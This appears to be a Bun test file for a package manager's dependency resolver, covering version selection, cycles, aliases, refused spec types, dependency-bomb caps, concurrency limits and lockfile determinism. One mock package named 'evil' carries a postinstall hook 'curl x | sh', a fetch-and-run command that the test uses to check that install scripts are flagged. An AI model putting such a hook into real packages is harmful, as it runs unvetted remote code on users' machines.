import { describe, expect, test } from 'bun:test';
import { serializeLockfile, toLockfile } from '../../src/core/lockfile.ts';
import { MemoryMetaStore, RegistryClient, DEFAULT_REGISTRY_OPTIONS } from '../../src/core/registry.ts';
import { Resolver, DEFAULT_RESOLVER_OPTIONS, candidatesFor, type VersionSelector } from '../../src/core/resolver.ts';
import { parseSpec } from '../../src/core/spec.ts';
import { fixedClock } from '../../src/utils/clock.ts';
import { DependencyGraphTooLargeError, NoMatchingVersionError, UnsupportedSpecError } from '../../src/utils/errors.ts';
import { BoundedPool } from '../../src/utils/pool.ts';
import { HttpTransport } from '../../src/utils/transport.ts';
import { mockRegistry, noSleep, NOW, packument, REG, type MockRegistry } from '../helpers/mock-registry.ts';

const deps = (o: Record<string, string>) => new Map(Object.entries(o));

function setup(docs: Record<string, unknown>, opts = {}, selector?: VersionSelector, latency = 0) {
  const reg = mockRegistry(docs, latency);
  const client = new RegistryClient(
    new HttpTransport(reg.fetch, { attempts: 1, baseDelayMs: 1, maxDelayMs: 1 }, noSleep),
    new BoundedPool(3),
    new MemoryMetaStore(),
    fixedClock(NOW),
    { ...DEFAULT_REGISTRY_OPTIONS, registry: REG },
  );
  const resolver = new Resolver(client, selector, { ...DEFAULT_RESOLVER_OPTIONS, platform: 'linux', arch: 'x64', ...opts });
  return { reg, resolver };
}

const world = {
  app: packument('app', { '1.0.0': { deps: { lib: '^2.0.0', util: '~1.2.0' } } }),
  lib: packument('lib', { '1.9.0': {}, '2.0.0': { deps: { util: '^1.2.0' } }, '2.3.1': { deps: { util: '^1.2.0' } }, '3.0.0': {} }, '2.3.1'),
  util: packument('util', { '1.2.0': {}, '1.2.5': {}, '1.3.0': {} }),
  // cycle: a -> b -> a
  a: packument('a', { '1.0.0': { deps: { b: '1.x' } } }),
  b: packument('b', { '1.0.0': { deps: { a: '1.x' } } }),
  '@scope/real': packument('@scope/real', { '4.0.0': {} }),
};

describe('Resolver', () => {
  test('recursive tree, highest satisfying, respects latest tag', async () => {
    const { resolver, reg } = setup(world);
    const g = await resolver.resolve({ dependencies: deps({ app: '^1.0.0' }) });
    expect(g.roots.get('app')).toBe('app@1.0.0');
    expect(g.nodes.get('app@1.0.0')?.dependencies.get('lib')).toBe('lib@2.3.1');
    expect(g.nodes.get('app@1.0.0')?.dependencies.get('util')).toBe('util@1.2.5'); // ~1.2.0
    expect(g.nodes.get('lib@2.3.1')?.dependencies.get('util')).toBe('util@1.3.0'); // ^1.2.0
    expect(g.nodes.get('lib@2.3.1')?.publishedAt).toBeNumber();
    expect(reg.hits.get('util')).toBe(1); // packument fetched once despite 2 edges
  });

  test('cycles terminate', async () => {
    const { resolver } = setup(world);
    const g = await resolver.resolve({ dependencies: deps({ a: '*' }) });
    expect(g.nodes.get('b@1.0.0')?.dependencies.get('a')).toBe('a@1.0.0');
    expect(g.nodes.size).toBe(2);
  });

  test('npm: alias resolves the real package under the alias name', async () => {
    const { resolver } = setup(world);
    const g = await resolver.resolve({ dependencies: deps({ fancy: 'npm:@scope/real@^4' }) });
    expect(g.roots.get('fancy')).toBe('@scope/real@4.0.0');
  });

  test('no match -> NoMatchingVersionError; optional failure only warns', async () => {
    const { resolver } = setup(world);
    await expect(resolver.resolve({ dependencies: deps({ util: '^9' }) })).rejects.toBeInstanceOf(NoMatchingVersionError);
    const g = await resolver.resolve({ optionalDependencies: deps({ util: '^9', ghost: '1' }) });
    expect(g.nodes.size).toBe(0);
    expect(g.warnings.filter((w) => w.kind === 'optional-failed')).toHaveLength(2);
  });

  test('git/url/file specs are refused', () => {
    for (const s of ['github:x/y', 'git+https://h/x.git', 'https://h/x.tgz', 'file:../x', 'user/repo', 'workspace:*']) {
      expect(() => parseSpec('x', s)).toThrow(UnsupportedSpecError);
    }
  });

  test('platform-mismatched optional deps are skipped', async () => {
    const { resolver } = setup({ fsevents: packument('fsevents', { '2.3.3': { os: ['darwin'] } }) });
    const g = await resolver.resolve({ optionalDependencies: deps({ fsevents: '^2' }) });
    expect(g.nodes.size).toBe(0);
  });

  test('install scripts and unmet peers are surfaced', async () => {
    const { resolver } = setup({
      evil: packument('evil', { '1.0.0': { scripts: { postinstall: 'curl x | sh' }, peers: { react: '^18' } } }),
    });
    const g = await resolver.resolve({ dependencies: deps({ evil: '1' }) });
    expect(g.warnings.map((w) => w.kind).sort()).toEqual(['install-script', 'peer-unmet']);
    expect(g.nodes.get('evil@1.0.0')?.hasInstallScript).toBe(true);
  });

  test('dependency bomb is capped', async () => {
    const docs: Record<string, unknown> = {};
    for (let i = 0; i < 50; i++) docs[`p${i}`] = packument(`p${i}`, { '1.0.0': { deps: { [`p${i + 1}`]: '1' } } });
    docs['p50'] = packument('p50', { '1.0.0': {} });
    const { resolver } = setup(docs, { maxNodes: 10 });
    await expect(resolver.resolve({ dependencies: deps({ p0: '1' }) })).rejects.toBeInstanceOf(DependencyGraphTooLargeError);
  });

  test('selector hook sees newest-first candidates and can reject', async () => {
    const seen: string[][] = [];
    const oldest: VersionSelector = {
      select: ({ candidates }) => {
        seen.push([...candidates]);
        const version = candidates[candidates.length - 1] ?? '';
        return { version, rejected: candidates.slice(0, -1).map((v) => ({ version: v, reason: 'test' })) };
      },
    };
    const { resolver } = setup(world, {}, oldest);
    const g = await resolver.resolve({ dependencies: deps({ util: '^1.2.0' }) });
    expect(seen[0]).toEqual(['1.3.0', '1.2.5', '1.2.0']);
    expect(g.roots.get('util')).toBe('util@1.2.0');
    expect(g.warnings.filter((w) => w.kind === 'selector-rejected')).toHaveLength(2);
  });

  test('network concurrency stays bounded by the pool', async () => {
    const docs: Record<string, unknown> = {};
    const rootDeps: Record<string, string> = {};
    for (let i = 0; i < 30; i++) { docs[`w${i}`] = packument(`w${i}`, { '1.0.0': {} }); rootDeps[`w${i}`] = '1'; }
    const { resolver, reg }: { resolver: Resolver; reg: MockRegistry } = setup(docs, {}, undefined, 3);
    const g = await resolver.resolve({ dependencies: deps(rootDeps) });
    expect(g.nodes.size).toBe(30);
    expect(reg.peakInFlight).toBeLessThanOrEqual(3);
  });

  test('lockfile is deterministic', async () => {
    const one = await setup(world).resolver.resolve({ dependencies: deps({ app: '1', a: '1' }) });
    const two = await setup(world).resolver.resolve({ dependencies: deps({ a: '1', app: '1' }) });
    expect(serializeLockfile(toLockfile(one))).toBe(serializeLockfile(toLockfile(two)));
    expect(Object.keys(toLockfile(one).packages)).toEqual([...Object.keys(toLockfile(one).packages)].sort());
  });
});

describe('candidatesFor', () => {
  test('dist-tag ranges', async () => {
    const { resolver } = setup(world);
    const g = await resolver.resolve({ dependencies: deps({ lib: 'latest' }) });
    expect(g.roots.get('lib')).toBe('lib@2.3.1');
    expect(candidatesFor).toBeFunction();
  });
});
